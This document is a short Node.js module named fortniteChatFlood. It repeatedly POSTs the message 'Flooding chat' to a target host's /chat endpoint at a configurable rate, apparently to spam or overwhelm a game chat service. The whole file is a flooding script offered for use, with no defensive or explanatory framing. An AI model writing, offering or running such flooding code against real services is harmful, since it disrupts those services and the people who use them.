const request = require('request');

function fortniteChatFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const options = {
            url: `https://${target}/chat`,
            method: 'POST',
            json: {
                message: 'Flooding chat'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                logOutput('Error: ' + error.message);
            } else {
                logOutput('Sent Fortnite chat message');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = fortniteChatFlood;
